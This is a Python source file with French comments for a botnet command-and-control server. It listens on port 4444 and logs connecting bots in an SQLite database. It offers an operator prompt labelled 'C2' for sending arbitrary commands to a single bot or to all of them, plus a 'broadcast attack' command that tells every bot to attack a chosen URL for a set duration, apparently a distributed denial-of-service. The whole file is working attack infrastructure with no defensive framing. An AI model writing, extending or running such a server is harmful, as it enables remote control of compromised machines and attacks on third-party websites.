import socket
import threading
import sqlite3

# Connexion à la base de données SQLite
conn = sqlite3.connect("clients.db", check_same_thread=False)
cursor = conn.cursor()

# Création de la table clients
cursor.execute("""
    CREATE TABLE IF NOT EXISTS clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        port INTEGER,
        unique_id TEXT UNIQUE
    )
""")
conn.commit()

clients = {}  # Dictionnaire {unique_id: (socket, address)}

def save_client(unique_id, ip, port):
    """Sauvegarde un client en base de données s'il n'existe pas déjà."""
    cursor.execute("SELECT * FROM clients WHERE unique_id = ?", (unique_id,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO clients (unique_id, ip, port) VALUES (?, ?, ?)", (unique_id, ip, port))
        conn.commit()

def get_client_id(unique_id):
    """Récupère l'ID d'un client via son identifiant unique."""
    cursor.execute("SELECT id FROM clients WHERE unique_id = ?", (unique_id,))
    result = cursor.fetchone()
    return result[0] if result else None

def handle_client(client_socket, address):
    """Gère la connexion d'un client."""
    try:
        # Le client envoie son identifiant unique au début
        unique_id = client_socket.recv(1024).decode()
        save_client(unique_id, address[0], address[1])
        client_id = get_client_id(unique_id)

        clients[unique_id] = (client_socket, address)
        print(f"[+] Client {client_id} connecté depuis {address} (ID Unique: {unique_id})")

        while True:
            command = client_socket.recv(1024).decode()
            if not command:
                break
            print(f"[Client {client_id}] {command}")

    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        print(f"[-] Client {client_id} déconnecté.")
        clients.pop(unique_id, None)
        client_socket.close()

def start_server(host="0.0.0.0", port=4444):
    """Lance le serveur et écoute les connexions."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(10)
    print(f"[*] Serveur en écoute sur {host}:{port}")

    while True:
        client_socket, address = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, address)).start()

def send_command():
    """Interface interactive pour envoyer des commandes aux clients."""
    while True:
        print("\nClients connectés :")
        for unique_id, (_, addr) in clients.items():
            client_id = get_client_id(unique_id)
            print(f"{client_id} - {addr}")

        selected_id = input("Sélectionner un client (ID), 'broadcast' pour tous, 'exit' pour quitter : ")
        
        if selected_id.lower() == "exit":
            break

        elif selected_id.lower() == "broadcast":
            command = input("Commande pour tous > ")
            for client_socket, _ in clients.values():
                client_socket.send(command.encode())
            continue

        elif selected_id.lower().startswith("broadcast attack"):
            parts = selected_id.split()
            if len(parts) < 4:
                print("Utilisation : broadcast attack <url> <durée>")
                continue
            url, duration = parts[2], parts[3]
            command = f"attack {url} {duration}"
            for client_socket, _ in clients.values():
                client_socket.send(command.encode())
            print(f"[*] Attaque lancée sur {url} pendant {duration} secondes")
            continue

        try:
            selected_id = int(selected_id)
            cursor.execute("SELECT unique_id FROM clients WHERE id = ?", (selected_id,))
            result = cursor.fetchone()
            if not result:
                print("ID invalide.")
                continue

            unique_id = result[0]
            if unique_id not in clients:
                print("Client non connecté.")
                continue

            client_socket, _ = clients[unique_id]

            while True:
                command = input(f"C2[{selected_id}]> ")
                if command.lower() == "back":
                    break
                client_socket.send(command.encode())

        except ValueError:
            print("ID invalide.")

# Démarrer le serveur dans un thread
server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

# Interface pour envoyer des commandes
send_command()


